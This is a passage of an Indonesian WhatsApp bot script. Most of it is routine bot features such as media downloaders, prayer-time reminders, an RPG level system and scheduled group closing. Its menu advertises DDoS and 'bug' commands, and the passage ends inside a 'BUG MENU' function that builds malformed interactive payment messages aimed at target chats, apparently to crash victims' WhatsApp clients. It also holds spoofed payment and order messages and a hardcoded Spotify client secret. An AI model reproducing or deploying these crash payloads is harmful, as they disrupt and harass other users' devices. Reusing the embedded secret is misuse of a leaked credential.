│  ◦ .ᴇᴍɪʟɪᴀ
│  ◦ .ᴇʀᴢᴀ
│  ◦ .ᴇxᴏ
│  ◦ .ɢᴀᴡᴇᴡᴀʟᴘᴀᴘᴇʀ
│  ◦ .ɢʀᴇᴍᴏʀʏ
│  ◦ .ʜᴀᴄᴋᴇʀ
│  ◦ .ʜᴇꜱᴛɪᴀ
│  ◦ .ʜɪɴᴀᴛᴀ
│  ◦ .ʜᴜꜱʙᴜ
│  ◦ .ɪɴᴏʀɪ
│  ◦ .ɪꜱʟᴀᴍɪᴄ
│  ◦ .ɪꜱᴜᴢᴜ
│  ◦ .ɪᴛᴀᴄʜɪ
│  ◦ .ɪᴛᴏʀɪ
│  ◦ .ᴊᴇɴɴɪᴇ
│  ◦ .ᴊɪꜱᴏ
│  ◦ .ɴᴀʀᴜᴛᴏ
│  ◦ .ɴᴇxᴛʟɪʙᴜʀ
│  ◦ .ɴᴘᴍꜱ
│  ◦ .ᴛᴏᴘᴅᴏᴜᴊɪɴ
│  ◦ .ꜰᴀᴋᴇᴛᴡᴇᴇᴛ 
│  ◦ .ʟᴀʟᴇʜᴜ
└ ◦ .ꜱᴛɪᴄᴋᴇʀꜱ`
//==========PESANN CONSOLE====================//

    
    //funtion ataau terserah
async function uploadFile(path) {
	let form = new FormData()
	form.append('files[]', fs.createReadStream(path))
	let res = await (await fetch('https://uguu.se/upload.php', {
		method: 'post',
		headers: {
			...form.getHeaders()
		},
		body: form
	})).json()
	await fs.promises.unlink(path)
	return res
}
    
async function uploadUguu(path) {
  try {
    const form = new FormData()
    form.append("files[]", fs.createReadStream(path))   
    const res = await fetch("https://uguu.se/upload.php", {
      method: "POST",
      headers: form.getHeaders(),
      body: form
    })    
    const json = await res.json()
    await fs.promises.unlink(path)   
    return json
  } catch (e) {
    await fs.promises.unlink(path)
    throw "Upload failed"
  }
}
    
    async function shannzCdn(path) {
  const form = new FormData();

  const fileStream = fs.createReadStream(path);
  form.append("file", fileStream);

  try {
    const response = await axios.post("https://api.shannmoderz.xyz/server/upload", form, {
      headers: {
        ...form.getHeaders(), 
      },
    });

    return response.data
  } catch (error) {
    return error.message
  }
}
//============================================//
    /*[ *FUNGSI DOWNLOAD STATUS* ]

// contoh nya ketik dan reply *download* di status temen mu atau kamu

Sumber: https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i*/

try {
const textLower = m.text.toLowerCase();
if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
 const quotedMessage = m.msg.contextInfo.quotedMessage;
 if (quotedMessage) {
 if (quotedMessage.imageMessage) {
let imageCaption = quotedMessage.imageMessage.caption;
let imageUrl = await ptz.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
ptz.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
reply('*Downloading status...*');
 }
 if (quotedMessage.videoMessage) {
let videoCaption = quotedMessage.videoMessage.caption;
let videoUrl = await ptz.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
ptz.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
reply('*Downloading status...*');
 }
 }
}
} catch (error) {
console.error("Error in 'send message' handling:", error);
}
//=============FUNTION BUG=====================//
    function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return ptz.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return ptz.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
    //auto download #ctto
        if (db.data.settings[botNumber].autodownload && !m.key.fromMe && !isCmd2) {
try {
if (budy.match(`instagram.com`)) {
await ptz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/instagram?url=${budy}`)
ptz.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Auto Download ✅`}, {quoted: m})
await ptz.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`tiktok.com`)) {
await ptz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${budy}`)
ptz.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `Auto Download ✅`}, {quoted: m})
await ptz.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`facebook.com`)) {
await ptz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/facebook?url=${budy}`)
ptz.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Auto Download ✅`}, {quoted: m})
await ptz.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`youtube.com|youtu.be`)) {
await ptz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.junn4.my.id/download/ytmp4?url=${budy}`)
ptz.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ``}, {quoted: m})
await ptz.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
await ptz.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
} 
    /* JANGAN HAPUS INI 
SCRIPT BY © VYNAA VALERIE 
•• recode kasih credits 
•• contacts: (6282389924037)
•• instagram: @vynaa_valerie 
•• (github.com/VynaaValerie) 
*/
//export async function before(m) {
    ptz.autosholat = ptz.autosholat ? ptz.autosholat : {};
    let id = m.chat;
    let jadwalGrup = {
        Tutup: "23:00",
        Buka: "04:10",
    };
    const date = new Date((new Date).toLocaleString("en-US", {
        timeZone: "Asia/Jakarta"
    }));
    const hours = date.getHours();
    const minutes = date.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
    for (const [aksi, waktu] of Object.entries(jadwalGrup)) {
        if (timeNow === waktu && !(id in ptz.autosholat)) {
            if (aksi === "Buka") {
                await ptz.groupSettingUpdate(m.chat, 'not_announcement');
                reply('🎉 Grup sudah dibuka! Mari kita melakukan Diskusi seruu!!🎉, dan jangan lupa sholat subuh kak, Untuk wilayah jakarta dan sekitarnya 😇');
            } else if (aksi === "Tutup") {
                await ptz.groupSettingUpdate(m.chat, 'announcement');
                reply('🌙 Grup ditutup untuk sementara. Mari beristirahat dan bersiap untuk besok! 🌙');
            }
            ptz.autosholat[id] = setTimeout(() => {
                delete ptz.autosholat[id];
            }, 57000);
        }
    }

    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? ptz.user.jid : m.sender;
    let jadwalSholat = {
        Dhuhr: "12:10",
        Ashar: "15:10",
        midnight: "00:30",
        Maghrib: "18:20",
        Isha: "19:30",
        Subuh: "05:10",
        Pagi: "06:00",
        Malam: "20:00",
    };
    const dateSholat = new Date((new Date).toLocaleString("en-US", {
        timeZone: "Asia/Jakarta"
    }));
    const hoursSholat = dateSholat.getHours();
    const minutesSholat = dateSholat.getMinutes();
    const timeNowSholat = `${hoursSholat.toString().padStart(2, "0")}:${minutesSholat.toString().padStart(2, "0")}`;
    for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
        if (timeNowSholat === waktu && !(id in ptz.autosholat)) {
            let caption = "";
            let mention = `@${who.split("@")[0]}` // Mendapatkan nama pengguna untuk mention
            if (sholat === "Dhuhr") {
                caption = `_Waktu Sholat Dhuhr Telah Tiba 🕌_ (${waktu})\n\nAmbil air wudhu dan segeralah sholat`;
            } else if (sholat === "Ashar") {
                caption = `_Waktu Sholat Ashar Telah Tiba 🕌_ (${waktu})\n\nAmbil air wudhu dan segeralah sholat`;
            } else if (sholat === "midnight") {
                caption = `_Waktu Sholat Tengah Malam Telah Tiba 🕌_ (${waktu})\n\nAmbil air wudhu dan segeralah sholat`;
            } else if (sholat === "Maghrib") {
                caption = `_Waktu Sholat Maghrib Telah Tiba 🕌_ (${waktu})\n\nAmbil air wudhu dan segeralah sholat`;
            } else if (sholat === "Isha") {
                caption = `_Waktu Sholat Isha Telah Tiba 🕌_ (${waktu})\n\nAmbil air wudhu dan segeralah sholat`;
            } else if (sholat === "Subuh") {
                caption = `_Waktu Sholat Subuh Telah Tiba 🕌_ (${waktu})\n\nAmbil air wudhu dan segeralah sholat`;
            } else if (sholat === "Pagi") {
                caption = `_Selamat pagi! sayang🌅_`;
            } else if (sholat === "Malam") {
                caption = `_Selamat malam! sayang🌙_`;
            }

            ptz.autosholat[id] = [
                await reply(`${mention} ${caption}`, null, {
                    contextInfo: {
                        mentionedJid: [who]
                    }
                }),
                setTimeout(() => {
                    delete ptz.autosholat[id]
                }, 57000)
            ];
        }
    }
/*============== APA RPG ATAU EXP ==============*/
const items = {
buy: {
limit: {
exp: 999
},
potion: {
money: 1250,
},
trash: {
money: 4,
},
wood: {
money: 700
},
rock: {
money: 850
},
string: {
money: 400
},
iron: { 
	money: 3000
}
},
sell: {
potion: {
money: 125,
},
trash: {
money: 2
},
wood: {
money: 600
},
rock: {
money: 750
},
string: {
money: 300
},
iron: {
money: 2500
},
gold: {
money: 4700
},
diamond: {
money: 9000
},
emerald: {
money: 15000
}
}
}
//
const rewards = {
  exp: 15000,
  money: 35999,
  potion: 9,
}
const rewardss = {
exp: 50000,
money: 49999,
potion: 10,
mythic: 3,
legendary: 1
}
function isNumber(number) {
if (!number) return number
number = parseInt(number)
return typeof number == 'number' && !isNaN(number)
}

 if (db.data.users[m.sender].autolevelup) {
let user = global.db.data.users[m.sender]
if (!user.autolevelup) return !0
let before = user.level * 1
while (levelling.canLevelUp(user.level, user.exp, global.multiplier)) user.level++
if (user.level <= 1) {
user.role = 'Petualangan Awal 🌄'
} else if (user.level <= 11) {
user.role = 'Pertarungan Melawan Kegelapan 🗡️'
} else if (user.level <= 21) {
user.role = 'Kemunculan Ancaman Baru ☠️'
} else if (user.level <= 31) {
user.role = 'Kehancuran Dunia yang Terancam 🌍'
} else if (user.level <= 41) {
user.role = 'Revolusi Pahlawan ⚔️'
} else if (user.level <= 51) {
user.role = 'Era Kedamaian yang Rapuh 🕊️'
} else if (user.level <= 61) {
user.role = 'Masa Depan yang Tidak Pasti 🌌'
} else if (user.level <= 71) {
user.role = 'Kembalinya Ancaman Kuno 🔮'
} else if (user.level <= 81) {
user.role = 'Misi Keselamatan Galaksi 🚀'
} else if (user.level <= 91) {
user.role = 'Perang Besar: Awal dari Semua 🌟'
} else if (user.level <= 100) {
user.role = 'Perang Besar: Akhir dari Semua 💥'
}
let role = user.role
if (before !== user.level) {
let naiklevell = `乂  L E V E L  U P

┌  ≡ Progress : *${before} -> ${user.level}*
└  ≡ Role : *${db.data.users[m.sender].role}* 


*Hadiah Level Up:*
+1 Pangkat Yang Terbuka`.trim()
try {
	let image, data, pp
				try { pp = await ptz.profilePictureUrl(m.sender, 'image') }
				catch { pp = 'https://telegra.ph/file/60b60aad1312a63d640a6.jpg' }
				image = await new can.Up().setAvatar(pp).toAttachment()
				data = await image.toBuffer()
				await ptz.sendMessage(m.chat, { image: data, caption: naiklevell }, { quoted : m })
} catch {
reply(naiklevell)
}
}
}       

if (global.db.data.users[m.sender].level === 900 && m.isGroup) {
let user = global.db.data.users[m.sender]
reply(`*🥳 Selamat Untuk Kamu ${pushname}*
> - Kamu Mendapatkan Gratis Premium! 7 Hari Karna Kamu Naik Level 900!!!!!!, Selamat Untuk Pencapaian Mu Aku Menghargainya 🙇`)
user.level = 0

  var jumlahHari = 86400000 * 7; 
  var now = new Date() * 1;

  global.db.data.users[m.sender].premium = true
  
  if (now < global.db.data.users[m.sender].premiumDate) {
  global.db.data.users[m.sender].premiumDate += jumlahHari;
   } else {
   global.db.data.users[m.sender].premiumDate = now + jumlahHari;
   }
}

function formatCurrency(amount) {
  return `${amount.toLocaleString()}zm`; 
}
let formattedMoneyZ;
if (global.db.data.users[m.sender].money && global.db.data.users[m.sender]) {
formattedMoneyZ = formatCurrency(global.db.data.users[m.sender].money);
}
    const isPremium = global.db.data.users[m.sender].premium
    //*[ NEW CODE AUTO AI ]*
/*ptz.elxyz = ptz.elxyz ? ptz.elxyz : {};
if (m.isBaileys && m.fromMe) return;
if (!m.quoted || m.quoted.text) return;
if (!ptz.elxyz[m.chat]) return;      
const prompt = m.text;
let sessions = {};
let aiStatus = {};
if (!prompt || prompt.startsWith('/')) {
  if (!ptz.elxyz[m.chat]) return;
}

console.log(`[${moment().format('HH:mm')}] from @${pushname}: ${prompt}`);

try {
  const now = moment().tz('Asia/Jakarta');
  const jam = now.format('HH:mm');
  const tgl = now.format('DD-MM-YYYY');
  const hari = now.format('dddd');
  
  let postData = {
    userMessage: prompt,
    sessionId: `${m.sender}`,
    character: `lu adalah elxyz, lu adalah seorang mahasiswi jutek, pemarah dan mudah emosi, lu menggunakan bahasa gaul Indonesia yang dimana lu untuk kamu dan gw untuk kamu, kamu suka memakai emoji marah atau emoji 🖕, kamu suka ngomong kotor seperti kntl, mmk ketika marah, nama pembuat kamu adalah kiicode dengan nama aslinya Muhammad Zaki, ketika seseorang meminta anda untuk mencarikan gambar anda harus ngerespon untuk harus menunggu sebentar, jika ada hang meminta mengirimkan nomor owner lu, lu harus ngerespon untuk harus menunggu di karenakan lu mencarikan dulu kontak owner lu, jika seseorang meminta anda untuk membuat gambar anda bakak ngerespon untuk harus menunggu karena dalam pembuatan`
  };

  let response = await axios({
    url: "https://elxyzgpt.vercel.app/generate-response",
    method: 'POST',
    data: postData,
    headers: {
      'Content-Type': 'application/json'
    }
  });

  const answer = response.data.response;
  kiibut(answer);

  if (answer.includes('owner')) {
    let list = [{
      displayName: "KiiCode",
      vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${ownername}\nFN:${ownername}\nitem1.TEL;waid=${owner}:${owner}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET: kiicodeofficial@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://kiicodeofficial.my.id\nitem3.X-ABLabel:Internet\nitem4.ADR:;;Solok, Sumatera Barat, Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
    }];
    ptz.sendMessage(m.chat, {
      contacts: {
        displayName: `${list.length} Kontak`,
        contacts: list
      }
    }, { quoted: m });
  } else if (answer.includes('foto')) {
    const query = prompt.split('foto')[1].trim();
    const images = await (await fetch(`https://api.elxyzgpt.xyz/search/pinterest?apikey=${elxyz}&query=${query}`)).json();
    ptz.sendMessage(m.chat, { image: { url: `${images.result[0]}` }}, { quoted: m });
  } else if (answer.includes('gambar')) {
    const query = prompt.split('gambar')[1].trim();
    const images = await (await fetch(`https://api.elxyzgpt.xyz/ai/texttoanime?apikey=${API.ELXYZ}&prompt=${query}`)).json();
    ptz.sendMessage(m.chat, { image: { url: `${images.result.imageUrl}` }}, { quoted: m });
  }
} catch (error) {
  console.error("Error during chat request:", error);
  return "An error occurred during the chat process.";
}*/
//==============ALL FUNCTION================//
    function getRandomInt(min, max) {
	min = Math.ceil(min);
	max = Math.floor(max);
	return Math.floor(Math.random() * (max - min + 1)) + min;
}	
//export const disabled = false;
/*
SCRIPT BY © VYNAA VALERIE 
•• recode kasih credits 
•• contacts: (t.me/VLShop2)
•• instagram: @vynaa_valerie 
•• (github.com/VynaaValerie) 
*/
    if (antibotz) {
    if (!m.isGroup) return;
    if (m.fromMe) return true;
    if (["BAE", "B1E", "3EB0", "WA"].some(pfx => m.id.startsWith(pfx) && [12, 16, 20, 22, 40].includes(m.id.length))) {

            reply("*Bot Lain Terdeteksi*\n\nMaaf Kak Harus Saya Keluarkan, Karna *Admin Mengaktifkan Anti Bot* :)");
            await sleep(1000);

            if (!isAdmins && isBotAdmins) {
                await ptz.groupParticipantsUpdate(m.chat, [m.sender], "remove");  
            }
        }
    }
  //===========funtion menu dan lain"======//
    let menunye = `ʜᴀɪ ᴘᴇʀᴋᴇɴᴀʟᴋᴀɴ ꜱᴀʏᴀ ᴀᴅᴀʟᴀʜ ᴘʀᴏɢʀᴀᴍ ᴊᴀᴠᴀꜱᴄʀɪᴘᴛ ʏᴀɴɢ ʙᴇʀɴᴀᴍᴀ *ᴢᴀʀxɪᴏ ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ*, ʏᴀɴɢ ᴅɪ ʙᴜᴀᴛ ᴏʟᴇʜ ᴅᴇᴠ ʙᴇʀɴᴀᴍᴀ *ᴅɪᴄʜxᴘʟᴏɪᴛ >.<*

*| ɴᴀᴍᴇʙᴏᴛ :* ᴢᴀʀxɪᴏ
*| ᴠᴇʀꜱɪᴏɴ :* ᴠ1.0.0
*| ᴛᴏᴛᴀʟ ᴜꜱᴇʀ :* ${Object.keys(global.db.data.users).length} User
*| ʀᴜɴᴛɪᴍᴇ :* ${runtime(process.uptime())}
*| ᴛᴏᴛᴀʟ ꜰɪᴛᴜʀ :* 25
*| ᴘᴏᴡᴇʀᴇᴅ :* ᴅɪᴄʜxᴘʟᴏɪᴛ

ᴋᴇᴛɪᴋ *.ᴍᴇɴᴜᴀʟʟ/ɴᴀᴍᴇ ᴄᴏᴍᴍᴀɴᴅ* ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀᴛᴀᴜ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜱᴇᴍᴜᴀ ᴍᴇɴᴜ ᴅᴀʀɪ ʙᴏᴛ ɪɴɪ

⭓「 *ᴍᴇɴᴜ ʟɪꜱᴛ* *[ 10 ]* 」
│ *1.* ᴍᴇɴᴜᴏᴡɴᴇʀ /*ᴏᴡɴᴇʀᴍᴇɴᴜ*
│ *2.* ᴍᴇɴᴜᴅᴏᴡɴʟᴏᴀᴅ /*ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ*
│ *3.* ᴍᴇɴᴜꜰᴜɴ /*ꜰᴜɴᴍᴇɴᴜ*
│ *4.* ᴍᴇɴᴜᴍᴀɪɴ /*ᴍᴀɪɴᴍᴇɴᴜ*
│ *5.* ᴍᴇɴᴜɢᴀᴍᴇ /*ɢᴀᴍᴇᴍᴇɴᴜ*
│ *6.* ᴍᴇɴᴜᴅᴅᴏꜱ /*ᴅᴅᴏꜱᴍᴇɴᴜ*
│ *7.* ᴍᴇɴᴜɢʀᴏᴜᴘ /*ɢʀᴏᴜᴘᴍᴇɴᴜ*
│ *8.* ᴍᴇɴᴜʀᴘɢ /*ʀᴘɢᴍᴇɴᴜ*
│ *9.* ᴍᴇɴᴜᴛᴏᴏʟꜱ /*ᴛᴏᴏʟꜱᴍᴇɴᴜ*
│ *10.* ᴍᴇɴᴜʙᴜɢ /*ʙᴜɢᴍᴇɴᴜ*
└───────────────⭓`
//===========FUNTIONN ATAU SCREPE===========//
    try {
ppuser = await ptz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
/*try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
}*/
	let cron = require('node-cron')
        cron.schedule('00 00 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = 30
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Limit Ke Reset')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
    // respon list 
/*if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
ptz.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
ptz.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}*/

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
    // function resize
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};
    
    async function HDvideo() {
  try {
    const inputVideo = await ptz.downloadAndSaveMediaMessage(quoted);
    const outputVideo = 'output_2k.mp4';
    await new Promise((resolve, reject) => {
      ffmpeg(inputVideo)
        .outputOptions('-vf', 'scale=2560:1440')
        .on('start', commandLine => {
          console.log('Memulai proses dengan perintah:', commandLine);
        })
        .on('progress', progress => {
          console.log('Proses sedang berjalan:', progress.percent.toFixed(2) + '% selesai');
        })
        .on('end', () => {
          console.log('Proses selesai!');
          resolve();
        })
        .on('error', (err, stdout, stderr) => {
          console.error('Terjadi kesalahan:', err.message);
          console.error('stdout:', stdout);
          console.error('stderr:', stderr);
          reject(err);
        })
        .save(outputVideo);
    });
    const caption = 'Sukses membuat video menjadi HD';
    await ptz.sendMessage(m.chat, { caption: caption, video: { url: path.resolve(outputVideo) } }, { quoted: m });

  } catch (error) {
   m.reply('Terjadi kesalahan:', error);
  }
}
	//========== AUTO RESTART & DELSESI ======//
	if (automati) {
  nodecron.schedule('0 */1 * * *', () => {
    process.exit()
  })
}
//==============FAKE REPLY=====================//
    //*[ FAKE REPLY ]*

const fpayment = {
		key: {
			remoteJid: '0@s.whatsapp.net',
			fromMe: false,
			id: `6287888888888`,
			participant: '0@s.whatsapp.net'
		},
		message: {
			requestPaymentMessage: {
				currencyCodeIso4217: "USD",
				amount1000: 999999999,
				requestFrom: '0@s.whatsapp.net',
				noteMessage: {
					extendedTextMessage: {
						text: `*${global.botname}*\n👤 **\n�`
					}
				},
				expiryTimestamp: 999999999,
				amount: {
					value: 91929291929,
					offset: 1000,
					currencyCode: "INR"
				}
			}
		}
	}

const zyn = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2029",
      thumbnail: fkethmb,
      itemCount: 2024,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `${m.body || m.mtype}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: m.sender.split,
    forwardingScore: 999,
    isForwarded: true
  }
};
//==============FUNTION MP4/MP3================//
    const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
ytdl(Link, { filter: 'audioonly' }).pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
await ptz.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(`./${mp3File}`)
})
} catch (err) {
reply(`${err}`)
}
}
//=================================================//
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
let nana = ytdl(Link).pipe(fs.createWriteStream(mp4File)).on('finish', async () => {
await ptz.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}
//=========Automated close/open gc=============//
/*
*SUMBER: https://whatsapp.com/channel/0029VaJYWMb7oQhareT7F40V
*GRUP DISKUSI: https://chat.whatsapp.com/ETZ8r7CLypfAPH93q0gC0y
ini tanda air kang, jangan dihapus
*/

/*import moment from 'moment-timezone';
import schedule from 'node-schedule';*/

const timeZone = 'Asia/Jakarta';

// Konfigurasi waktu tutup dan buka grup
const closeTime = '02:05';
const openTime = '02:06';

// Daftar ID grup yang ingin dikelola
const groupChats = [
    '120363333361336457@g.us', // Ganti dengan ID grup yang sesuai
    '0987654321-0987654321@g.us'  // Tambahkan ID grup lain di sini
];

// Variabel status grup
let groupStatus = {};

// Fungsi untuk memeriksa waktu dan mengubah status grup
const checkGroupsStatus = async (conn) => {
    const currentTime = moment().tz(timeZone).format('HH:mm');

    for (const chatId of groupChats) {
        // Tutup grup jika waktunya tepat dan grup belum ditutup
        if (currentTime === closeTime && groupStatus[chatId] !== 'closed') {
            await ptz.groupSettingUpdate(chatId, 'announcement');
            await ptz.sendMessage(chatId, { text: 'Grup telah ditutup sesuai jadwal.' });
            groupStatus[chatId] = 'closed';
        }

        // Buka grup jika waktunya tepat dan grup belum dibuka
        if (currentTime === openTime && groupStatus[chatId] !== 'opened') {
            await ptz.groupSettingUpdate(chatId, 'not_announcement');
            await ptz.sendMessage(chatId, { text: 'Grup telah dibuka kembali sesuai jadwal.' });
            groupStatus[chatId] = 'opened';
        }
    }
};

// Jadwalkan pemeriksaan status grup setiap menit
schedule.scheduleJob('* * * * *', () => {
    checkGroupsStatus(ptz);
});
/*
auto tutup dan buka grup
*/
//=========TO LINK======//
function formatBytes(bytes) {
  if (bytes === 0) {
    return "0 B";
  }
  const sizes = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(1024));
  return `${(bytes / 1024 ** i).toFixed(2)} ${sizes[i]}`;
}

async function Catbox(content) {
  const { ext, mime } = (await fileTypeFromBuffer(content)) || {};
  const blob = new Blob([content.toArrayBuffer()], { type: mime });
  const formData = new FormData();
  const randomBytes = crypto.randomBytes(5).toString("hex");
  formData.append("reqtype", "fileupload");
  formData.append("fileToUpload", blob, randomBytes + "." + ext);

  const response = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: formData,
    headers: {
      "User-Agent":
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    },
  });

  return await response.text();
}
    
async function ytdlnew(videoUrl) {
    return new Promise(async (resolve, reject) => {
        try {
            const searchParams = new URLSearchParams();
            searchParams.append('query', videoUrl);
            searchParams.append('vt', 'mp3');
            const searchResponse = await axios.post(
                'https://tomp3.cc/api/ajax/search',
                searchParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (searchResponse.data.status !== 'ok') {
                throw new Error('Failed to search for the video.');
            }            
            const videoId = searchResponse.data.vid;
            const videoTitle = searchResponse.data.title;
            const mp4Options = searchResponse.data.links.mp4;
            const mp3Options = searchResponse.data.links.mp3;
            const mediumQualityMp4Option = mp4Options[136]; 
            const mp3Option = mp3Options['mp3128']; 
            const mp4ConvertParams = new URLSearchParams();
            mp4ConvertParams.append('vid', videoId);
            mp4ConvertParams.append('k', mediumQualityMp4Option.k);
            const mp4ConvertResponse = await axios.post(
                'https://tomp3.cc/api/ajax/convert',
                mp4ConvertParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (mp4ConvertResponse.data.status !== 'ok') {
                throw new Error('Failed to convert the video to MP4.');
            }
            const mp4DownloadLink = mp4ConvertResponse.data.dlink;
            const mp3ConvertParams = new URLSearchParams();
            mp3ConvertParams.append('vid', videoId);
            mp3ConvertParams.append('k', mp3Option.k);
            const mp3ConvertResponse = await axios.post(
                'https://tomp3.cc/api/ajax/convert',
                mp3ConvertParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (mp3ConvertResponse.data.status !== 'ok') {
                throw new Error('Failed to convert the video to MP3.');
            }
            const mp3DownloadLink = mp3ConvertResponse.data.dlink;
            resolve({
                title: videoTitle,
                mp4DownloadLink,
                mp3DownloadLink
            });
        } catch (error) {
            reject('Error: ' + error.message);
        }
    });
 }
    
    async function searchSpotifyTracks(query) {
const clientId = 'acc6302297e040aeb6e4ac1fbdfd62c3';
const clientSecret = '0e8439a1280a43aba9a5bc0a16f3f009';
const auth = Buffer.from(`${clientId}:${clientSecret}`).toString('base64');
const getToken = async () => {
const response = await fetch('https://accounts.spotify.com/api/token', {
method: 'POST',
timeout: 60000,
body: new URLSearchParams({
grant_type: 'client_credentials'
}),
headers: {
Authorization: `Basic ${auth}`
},
});
return (
await response.json()).access_token;
};

const accessToken = await getToken();
const offset = 10;
const searchUrl = `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&offset=${offset}`;
const response = await fetch(searchUrl, {
  headers: {
Authorization: `Bearer ${accessToken}`
  },
});
const data = await response.json();
return data.tracks.items;
}
	/*================= BUG MENU ============*/
	//NEWSTELER X PAYMENT\\
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
